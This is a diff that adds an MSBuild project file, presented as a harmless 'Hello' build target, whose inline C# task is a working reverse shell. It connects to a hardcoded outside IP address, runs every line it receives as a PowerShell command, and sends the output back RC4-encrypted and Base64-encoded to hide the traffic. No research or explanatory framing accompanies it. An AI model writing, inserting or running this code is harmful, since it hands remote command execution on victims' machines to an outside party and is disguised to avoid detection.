@@ -1,0 +1,120 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+ <Target Name="Hello">
+ <ClassExample />
+ </Target>
+ <UsingTask
+ TaskName="ClassExample"
+ TaskFactory="CodeTaskFactory"
+ AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+ <Task>
+ 
+ <Code Type="Class" Language="cs">
+ <![CDATA[
+using System;
+using System.IO;
+using System.Management.Automation;
+using System.Net.Sockets;
+using System.Text;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class ClassExample : Task, ITask
+{
+    static StreamWriter streamWriter;
+
+    public override bool Execute()
+    {
+        using (TcpClient client = new TcpClient("104.247.164.209", 8000))
+        {
+            using (Stream stream = client.GetStream())
+            {
+                using (StreamReader rdr = new StreamReader(stream))
+                {
+                    streamWriter = new StreamWriter(stream);
+                    StringBuilder strInput = new StringBuilder();
+
+                    using (PowerShell ps = PowerShell.Create())
+                    {
+                        // Initialize the PowerShell instance
+                        ps.Streams.Output.DataAdded += (sender, args) => CmdOutputDataHandler(sender, args, ps.Streams.Output[args.Index].ToString());
+
+                        while (true)
+                        {
+                            string command = rdr.ReadLine(); // Receive command from TCP
+                            if (string.IsNullOrEmpty(command))
+                                continue;
+
+                            ps.AddScript(command); // Add and execute the command
+                            ps.Invoke();
+
+                            ps.Commands.Clear(); // Clear previous commands
+                        }
+                    }
+                }
+            }
+        }
+        return true;
+    }
+
+    private void CmdOutputDataHandler(object sendingProcess, DataAddedEventArgs e, string outputLine)
+    {
+        if (!String.IsNullOrEmpty(outputLine))
+        {
+            try
+            {
+                // Encrypt and convert to Base64 as before
+                string pass = "121";
+                byte[] bytes = Encoding.ASCII.GetBytes(pass);
+                byte[] bytert = Encoding.ASCII.GetBytes(outputLine);
+                byte[] encrypted = Encrypt(bytes, bytert);
+                string str = Convert.ToBase64String(encrypted);
+                
+                streamWriter.WriteLine(str);
+                streamWriter.Flush();
+            }
+            catch (Exception err) { }
+        }
+    }
+
+    public static byte[] Encrypt(byte[] pwd, byte[] data)
+    {
+        int a, i, j, k, tmp;
+        int[] key, box;
+        byte[] cipher;
+
+        key = new int[256];
+        box = new int[256];
+        cipher = new byte[data.Length];
+
+        for (i = 0; i < 256; i++)
+        {
+            key[i] = pwd[i % pwd.Length];
+            box[i] = i;
+        }
+        for (j = i = 0; i < 256; i++)
+        {
+            j = (j + box[i] + key[i]) % 256;
+            tmp = box[i];
+            box[i] = box[j];
+            box[j] = tmp;
+        }
+        for (a = j = i = 0; i < data.Length; i++)
+        {
+            a++;
+            a %= 256;
+            j += box[a];
+            j %= 256;
+            tmp = box[a];
+            box[a] = box[j];
+            box[j] = tmp;
+            k = box[(box[a] + box[j]) % 256];
+            cipher[i] = (byte)(data[i] ^ k);
+        }
+        return cipher;
+    }
+}
+ ]]>
+ </Code>
+ </Task>
+ </UsingTask>
+</Project>
